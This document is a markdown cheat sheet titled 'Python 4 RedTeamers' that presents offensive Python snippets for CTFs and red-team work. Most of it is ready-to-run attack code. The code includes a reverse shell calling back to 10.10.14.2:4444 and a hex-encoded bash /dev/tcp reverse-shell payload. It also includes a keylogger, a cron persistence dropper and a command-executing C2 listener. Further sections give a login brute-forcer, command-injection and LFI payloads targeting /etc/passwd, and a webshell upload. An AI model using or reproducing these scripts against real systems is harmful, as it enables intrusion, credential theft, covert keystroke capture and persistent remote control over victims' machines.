# 🐍 Python 4 RedTeamers

## **Python for Red Teamers: Automate, Exploit, Dominate**

Python is the Swiss Army knife of cybersecurity — a language of choice for automation, exploitation, and post-exploitation tooling.\
From building scanners to crafting custom payloads, Python empowers hackers to **create, automate, and weaponize** at scale.

This guide delivers the full power of Python for red team operations, CTFs, and real-world assessments — from basics to advanced offensive modules.

***

### I. 🧩 Core Concepts

| Concept                  | Description                                                 |
| ------------------------ | ----------------------------------------------------------- |
| **Interpreter**          | `python3` — executes scripts or REPL mode.                  |
| **Modules**              | Reusable code libraries (`os`, `socket`, `requests`, etc.). |
| **Functions**            | Code blocks encapsulating logic for reusability.            |
| **Classes**              | Object-oriented approach for building larger tools.         |
| **Exceptions**           | Error handling (`try/except`).                              |
| **Virtual Environments** | Isolate project dependencies.                               |
| **PIP**                  | Python’s package installer for external libraries.          |

***

### II. ⚙️ Essential Python for Hackers

#### 🧠 System Interaction

```python
import os
os.system('id')
os.popen('ls -la').read()
```

#### 💻 Command Execution

```python
import subprocess
out = subprocess.getoutput('whoami')
print(out)
```

#### 🕵️ File Enumeration

```python
import os
for root, dirs, files in os.walk('/'):
    for f in files:
        if 'flag' in f:
            print(os.path.join(root, f))
```

#### 🌐 Networking & Sockets

```python
import socket
s = socket.socket()
s.connect(('10.10.10.10', 80))
s.send(b'GET / HTTP/1.1\r\n\r\n')
print(s.recv(1024))
```

#### 🧰 Web Requests

```python
import requests
r = requests.get('http://target.com')
print(r.text)
```

#### 🧬 Base64, Hashing, Encoding

```python
import base64, hashlib
data = "pwned"
print(base64.b64encode(data.encode()))
print(hashlib.md5(data.encode()).hexdigest())
```

***

### III. 🔧 Automation for CTFs

#### 🧩 Web Directory Brute-Forcer

```python
import requests

target = "http://10.10.10.5/"
with open('wordlist.txt') as f:
    for line in f:
        url = target + line.strip()
        r = requests.get(url)
        if r.status_code == 200:
            print(f"[+] Found: {url}")
```

#### 🔍 Simple Port Scanner

```python
import socket
for port in range(1,1025):
    s = socket.socket()
    s.settimeout(0.5)
    if s.connect_ex(('10.10.10.5', port)) == 0:
        print(f"Port {port} open")
    s.close()
```

#### 🧠 Reverse Shell (Linux)

```python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.2",4444))
os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2)
subprocess.call(["/bin/bash","-i"])
```

#### 🧙 Web Login Brute-Forcer

```python
import requests

target = "http://target.com/login"
for password in open("rockyou.txt"):
    data = {"username":"admin","password":password.strip()}
    r = requests.post(target, data=data)
    if "Welcome" in r.text:
        print(f"[+] Password found: {password.strip()}")
        break
```

***

### IV. 💣 Exploitation Framework Techniques

#### 🧩 Command Injection Automation

```python
import requests

target = "http://vulnerable.com/ping?ip="
payloads = [";id", "&&ls", "|whoami"]
for p in payloads:
    r = requests.get(target + p)
    if "uid=" in r.text:
        print(f"[+] Command Injection Found with payload: {p}")
```

#### 🧬 File Upload Exploit

```python
import requests
files = {'file': open('shell.php','rb')}
r = requests.post('http://target.com/upload', files=files)
print(r.text)
```

#### 🧠 LFI Automation

```python
import requests

url = "http://10.10.10.5/vuln.php?file="
payloads = ["../../../../etc/passwd", "../../../../var/www/html/config.php"]
for p in payloads:
    r = requests.get(url + p)
    if "root:" in r.text:
        print(f"[+] LFI success with payload: {p}")
```

***

### V. 🧨 Post-Exploitation & Persistence

#### 🧩 Keylogger

```python
from pynput import keyboard

def on_press(key):
    with open("log.txt", "a") as f:
        f.write(str(key) + "\n")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
```

#### 🧠 Persistence Dropper

```python
import os
os.system('echo "@reboot python3 /tmp/revshell.py" | crontab -')
```

***

### VI. 🧰 Advanced Red Team Use-Cases

#### 🧩 Building a Simple C2 Listener

```python
import socket,subprocess

HOST = '0.0.0.0'
PORT = 4444
s = socket.socket()
s.bind((HOST, PORT))
s.listen(1)
conn, addr = s.accept()
print(f"[+] Connection from {addr}")

while True:
    cmd = conn.recv(1024).decode()
    if cmd == 'exit':
        break
    output = subprocess.getoutput(cmd)
    conn.send(output.encode())
```

#### 🧠 Payload Encoding

```python
payload = 'bash -i >& /dev/tcp/10.10.14.2/4444 0>&1'
print(payload.encode('utf-8').hex())
```

#### 🔄 Multi-threaded Recon

```python
import threading, socket

def scan(ip, port):
    s = socket.socket()
    s.settimeout(0.5)
    if s.connect_ex((ip, port)) == 0:
        print(f"{ip}:{port} open")

for port in range(1,100):
    t = threading.Thread(target=scan, args=("10.10.10.5", port))
    t.start()
```

***

### VII. 🧠 Pro Tips for Python in CTFs

* Always use **virtual environments** (`venv`, `pipenv`) for project isolation.
* Automate recon and exploit chaining — Python + Bash = unbeatable.
* Combine with external tools (Nmap XML parsing, Gobuster output parsing).
* Convert Python scripts to binaries with **PyInstaller** for persistence or portability.
*   Use `argparse` to make reusable CLI tools:

    ```python
    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", required=True)
    args = parser.parse_args()
    print(f"Target: {args.target}")
    ```
* Log everything — use `logging` instead of print for long ops.
* Cache requests with `requests_cache` for stealth and performance.

***

### VIII. ⚔️ Bonus: Exploit Skeleton Template

```python
#!/usr/bin/env python3
# Exploit Template - For CTFs & HTB Labs
import requests, sys

def exploit(target):
    print(f"[+] Exploiting {target}")
    url = f"http://{target}/vuln.php?cmd=id"
    r = requests.get(url)
    if "uid=" in r.text:
        print("[+] Exploit successful!")
        print(r.text)
    else:
        print("[-] Failed")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <target>")
        sys.exit(1)
    exploit(sys.argv[1])
```

***
